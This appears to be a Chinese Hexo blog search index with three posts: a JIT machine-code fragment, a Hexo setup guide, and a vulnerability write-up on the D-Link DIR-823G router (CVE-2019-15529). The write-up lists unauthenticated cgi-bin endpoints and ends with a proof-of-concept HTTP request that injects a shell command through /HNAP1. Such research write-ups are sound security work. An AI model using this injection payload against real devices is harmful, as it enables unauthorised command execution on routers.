class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0000000000400526</span> &lt;<span class="hljs-keyword">inc</span>&gt;:<br>  <span class="hljs-number">400526</span>:<span class="hljs-number">55</span>                   <span class="hljs-keyword">push</span>   %rbp#保存上一个栈帧的基址，并把当前的栈指针赋给栈基址寄存器<br>  <span class="hljs-number">400527</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> e5             <span class="hljs-keyword">mov</span>    %rsp,%rbp<br>  40052a:<span class="hljs-number">89</span> <span class="hljs-number">7d</span> fc             <span class="hljs-keyword">mov</span>    %edi,-<span class="hljs-number">0x4</span>(%rbp)#把<span class="hljs-built_in">edi</span>存到栈上。在x64处理器上，前<span class="hljs-number">6</span>个参数都是使用寄存器传参的。第一个参数会使用<span class="hljs-built_in">rdi</span>，第二个参数使用 <span class="hljs-built_in">rsi</span>，等等。所以 <span class="hljs-built_in">edi</span> 里存的其实就是第一个参数，也就是整数 <span class="hljs-number">3</span><br>  <span class="hljs-number">40052d</span>:8b <span class="hljs-number">45</span> fc             <span class="hljs-keyword">mov</span>    -<span class="hljs-number">0x4</span>(%rbp),%eax#把上一步存到栈上的那个整数再存进 <span class="hljs-built_in">eax</span> 中<br>  <span class="hljs-number">400530</span>:<span class="hljs-number">83</span> c0 <span class="hljs-number">01</span>             <span class="hljs-keyword">add</span>    <span class="hljs-number">$0</span>x1,%eax#把 <span class="hljs-built_in">eax</span> 加上 <span class="hljs-number">1</span>， 然后就退栈，返回。按照x64的规定（ABI），返回值通过<span class="hljs-built_in">eax</span>传递<br>  <span class="hljs-number">400533</span>:<span class="hljs-number">5d</span>                   <span class="hljs-keyword">pop</span>    %rbp<br>  <span class="hljs-number">400534</span>:c3                   retq   <br></code></pre></td></tr></tbody></table></figure><p>我们发现，第三局第四局好像没有必要，gcc默认情况下生成的机器码有点没必要，它总要把入参放到栈上，但其实我们是可以直接把参数从rdi中放入到rax中的，在运行时修改inc的逻辑即可：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br> <span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;memory.h&gt;</span></span><br> <span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(* inc_func)</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span></span>; <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{<br>    <span class="hljs-type">char</span> code[] = { <br>        <span class="hljs-number">0x55</span>,             <span class="hljs-comment">// push rbp</span><br>        <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-comment">// mov rsp, rbp</span><br>        <span class="hljs-number">0x89</span>, <span class="hljs-number">0xf8</span>,       <span class="hljs-comment">// mov edi, eax</span><br>        <span class="hljs-number">0x83</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x01</span>, <span class="hljs-comment">// add $1, eax</span><br>        <span class="hljs-number">0x5d</span>,             <span class="hljs-comment">// pop rbp</span><br>        <span class="hljs-number">0xc3</span>              <span class="hljs-comment">// ret</span><br>    };  <br>    <span class="hljs-type">void</span> * temp = <span class="hljs-built_in">mmap</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in">sizeof</span>(code), PROT_WRITE | PROT_EXEC,<br>            MAP_ANONYMOUS | MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>); <br>    <span class="hljs-built_in">memcpy</span>(temp, code, <span class="hljs-built_in">sizeof</span>(code));<br>    inc_func p_inc = (inc_func)temp;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, <span class="hljs-built_in">p_inc</span>(<span class="hljs-number">7</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>mmap申请了一块有写权限和执行权限的内存，然后将手写的机器码考进去，使用一个函数指针指向这块内存并调用它，通过这种方式就可以执行这一段手写的机器码了。</p><p>我们通过手写机器码将原来的inc函数代替掉了，在新的例子中，我们使用程序中定义的数据来重新造了一个inc函数，这种在运行过程创建新的函数的方式，就是JIT的核心操作。</p>]]></content>
    
    
    
    <tags>
      
      <tag>chrome知识点</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Dlink DIR-823G 漏洞挖掘过程</title>
    <link href="/2022/08/09/Dlink-Dir-823G%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/"/>
    <url>/2022/08/09/Dlink-Dir-823G%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p>固件下载地址： <a href="https://pan.baidu.com/s/1YDuLaqdiDYXfkxJsjRqPNA">https://pan.baidu.com/s/1YDuLaqdiDYXfkxJsjRqPNA</a> 提取码：1ly1</p><h1 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h1><p><b>D-Link DIR-823G命令注入漏洞：</b></p><p>CVE编号：CVE-2019-15529</p><p>D-Link DIR-823G是中国台湾友讯（D-Link）公司的一款无线路由器。使用1.0.2B05版本固件的D-Link DIR-823G中的HNAP1存在命令注入漏洞。该漏洞源于外部输入数据构造可执行命令过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞执行非法命令。 </p><h1 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h1><ul><li>binwalk -Me 固件.bin //解开固件</li></ul><p><img src="https://i.loli.net/2020/09/24/p67xmQnKZ83I4Hy.png" alt="捕获.PNG"></p><p>是一个squashfs文件系统，标准linux目录结构。</p><ul><li>cat /etc/init.d/rcS //查看路由器开启的服务。</li></ul><p>发现一个goahead进程。</p><blockquote><p>GoAhead(嵌入式Web服务器)，GoAhead自身实现一个web服务器所需提供的基本功能，提供多种方法供扩展服务器的功能，包括asp过程、goforms过程。用户定制型非常强，可通过goaead的api定义url处理函数和可供asp文件中调用的函数。<br><code>websUrlHandlerDefine(T("/goform"), NULL, 0, websFormHandler, 0);</code> /goform的请求交给websFormHandler函数处理<br><code>websUrlHandlerDefine(T("/cgi-bin"), NULL, 0, websCgiHandler, 0);</code> /cgi-bin的请求交给websCgiHandler函数处理。</p></blockquote><h2 id="模拟运行固件"><a href="#模拟运行固件" class="headerlink" title="模拟运行固件"></a>模拟运行固件</h2><p>环境使用工具firmware-ayalysis-toolkit。</p><p>搭建教程：<a href="https://zhuanlan.zhihu.com/p/110806057">https://zhuanlan.zhihu.com/p/110806057</a></p><p>运行起来后nmap扫端口，发现开了http服务和dns服务。</p><p>访问<a href="http://192.168.0.1,可看到dlink登录页面.要求用户做一些设置,不需要密码即可登录./">http://192.168.0.1,可看到Dlink登录页面。要求用户做一些设置，不需要密码即可登录。</a></p><p><img src="https://i.loli.net/2020/09/24/QizkImP7T8lfOuw.png" alt="捕获.PNG"></p><p>在固件解压的文件下找到名为 web_mtn的文件，应该是web目录。其中cgi-bin目录下存放的cgi文件可以非授权访问，可能造成影响。</p><h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><p><b><code>/cgi-bin/ExportSettings.sh</code> 导出配置文件，造成信息泄露。</b></p><p><img src="https://i.loli.net/2020/09/24/Eewn8h6ApNbuyYW.png" alt="捕获.PNG"></p><p><b><code>/cgi-bin/upload_settings.cgi</code> 导入配置文件，可导入恶意篡改后的配置。</b></p><p><img src="https://i.loli.net/2020/09/24/oDs9v3ulnqfLOFd.png" alt="捕获.PNG"></p><p><b><code>/cgi-bin/GetDownLoadSyslog.sh</code> 获取系统部分启动信息<code>/var/log/messages*</code></b></p><p><img src="https://i.loli.net/2020/09/24/uqGwiQNa2eHz3CB.png" alt="捕获.PNG"></p><p><b><code>/cgi-bin/upload_firmware.cgi</code> 上传更新固件，可恶意修改固件</b></p><h2 id="goahead-自定义的请求处理函数"><a href="#goahead-自定义的请求处理函数" class="headerlink" title="goahead 自定义的请求处理函数"></a>goahead 自定义的请求处理函数</h2><blockquote><p>处理函数的参数列表：<br>int websCgiHandler(webs_t wp, char_t *urlPrefix, char_t *webDir, int arg, char_t *url, char_t <em>path, char_t</em> query)<br>goForms过程:它主要用来响应用户输入以更新系统设置或者执行特定的动作。在GoAhead中，goForms实现为一个URL处理器，它会解释以”/goform”开始的URLs。紧跟着”goform”之后的字符串定义了表单名字和用户请求的细节.</p></blockquote><p>IDA打开goahead分析：</p><p>通过字符串/cgi-bin或/goform找到定义url的函数位置。交叉引用，发现注册处理函数位置为0x42424C.</p><p><img src="https://i.loli.net/2020/09/24/awysHvo6RAzcgI7.png" alt="捕获.PNG"></p><p>websUrlHandlerDefine 的第一个参数为 url, 第四个参数应该就是相应 url 的处理函数。</p><p>抓取登录数据包，发现往/HNAP1发送。</p><p><img src="https://i.loli.net/2020/09/24/ARI7bVkUMSxZuDJ.png" alt="捕获.PNG"></p><p>分析/HNAP1（0x42383C）处理函数逻辑:</p><p><img src="https://i.loli.net/2020/09/24/EHM2wAsrvhCTJdj.png" alt="捕获.PNG"></p><p>从 wp 结构体中取出此次请求需要调用的函数名，然后去全局函数表里面搜索，找到之后在进行处理。</p><p>找到需要调用的处理函数后，会首先记录POST原始报文。这里记录日志首先是用snprintf生成命令，然后system执行。</p><p><img src="https://i.loli.net/2020/09/24/XD2TKt8ClQEZ6Af.png" alt="捕获.PNG"></p><p>此处可以直接注入’来命令执行。</p><blockquote><p>在PHP中常用到以下几个函数来执行外部命令:<br>system</p><blockquote><p>system()函数能够将字符串作为OS命令执行，并自带输出到当前页面的功能</p></blockquote><p>exec<br>passthru<br>shell_exec</p></blockquote><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight makefile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs makefile">POST /HNAP1/ HTTP/1.1<br><span class="hljs-section">Host: 192.168.0.1</span><br><span class="hljs-section">Content-Length: 53</span><br><span class="hljs-section">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36</span><br><span class="hljs-section">Content-Type: text/xml; charset=UTF-8</span><br><span class="hljs-section">Accept: */*</span><br><span class="hljs-section">SOAPAction: "http://purenetworks.com/HNAP1/Login"</span><br><span class="hljs-section">Accept-Encoding: gzip, deflate</span><br><span class="hljs-section">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="hljs-section">Connection: close</span><br>'`echo hacked_by_hac425!!!!!!!! &gt; /web_mtn/hack.txt`'<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>IOT</tag>
      
      <tag>漏洞，路由器漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Win10下使用Hexo搭建个人博客</title>
    <link href="/2022/08/07/Win10%E4%B8%8B%E4%BD%BF%E7%94%A8Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <url>/2022/08/07/Win10%E4%B8%8B%E4%BD%BF%E7%94%A8Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<h2 id="下载安装git、nodejs"><a href="#下载安装git、nodejs" class="headerlink" title="下载安装git、nodejs"></a>下载安装git、nodejs</h2><p>下载地址: </p><p>git: <a href="https://git-scm.com/">https://git-scm.com/</a> </p><p>nodejs: <a href="http://nodejs.cn/download/">http://nodejs.cn/download/</a></p><p>将nodejs加入path环境变量中。打开cmd测试：</p><p><img src="https://s2.loli.net/2022/08/07/NduraiRMcEQythF.png" alt="图片.png"></p><blockquote><p>报错1：输入 <code>npm-v</code> 出现报错:</p></blockquote><pre><code class="hljs">npm WARN config global --global, --local are deprecated. Use `–location</code></pre><p>解决方法：打开<code>nodejs</code>安装位置文件夹，打开<code>npm.cmd</code>和<code>npm</code>，将文件中的<code>prefix -g</code>替换为<code>prefix --location=global</code>,保存后重新打开cmd测试即可。</p><h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><h3 id="换源（淘宝源）"><a href="#换源（淘宝源）" class="headerlink" title="换源（淘宝源）"></a>换源（淘宝源）</h3><pre><code class="hljs">npm install -g cnpm --registry=https://registry.npm.taobao.orgcnpm -v </code></pre><p><img src="https://s2.loli.net/2022/08/07/9zM1KhnkOqAFsU6.png" alt="图片.png"></p><p>查看版本以及是否安装成功。</p><h3 id="安装hexo-1"><a href="#安装hexo-1" class="headerlink" title="安装hexo"></a>安装hexo</h3><pre><code class="hljs">cnpm install -g hexo-clihexo -v</code></pre><p>新建文件夹放置博客内容，在cmd中进入所建立的目录：</p><pre><code class="hljs">hexo init #初始化hexohexo s #启动hexo</code></pre><p>访问 <code> http://localhost:4000/</code>如下即成功：</p><p><img src="https://s2.loli.net/2022/08/07/dvIiunG5yhOEUX8.png" alt="图片.png"></p><h2 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h2><pre><code class="hljs">hexo new "文章标题"</code></pre><p>在目录/source/_posts/下生成文件.md<br>更新文章：<br>    hexo clean<br>    hexo g<br>    hexo s</p><h2 id="部署github"><a href="#部署github" class="headerlink" title="部署github"></a>部署github</h2><p>1、建立一个新的库，命名需要符合规则：<code>username.gitgub.io</code><br>2、命令行输入：</p><pre><code class="hljs">cnpm install --save hexo-deployer-git  </code></pre><p>3、更改设置</p><p>找到_config.yml文件，翻到最底部</p><p>将<code>type</code>改为<code>git</code></p><p>添加<code>repo: "此处为仓库地址"</code></p><p>添加<code>branch: master</code></p><p>repo为仓库地址 branch为master即可</p><p><img src="https://s2.loli.net/2022/08/07/akWVI3mUinyP2sJ.png" alt="图片.png"></p><p>4、部署到远端</p><pre><code class="hljs">git config --global user.email "xxx(此处为邮箱)"  git config --global user.name "xxx(此处为用户名)"  #github用户名hexo d  </code></pre><p>弹出网页提示是否关联git和github 授权即可</p>]]></content>
    
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
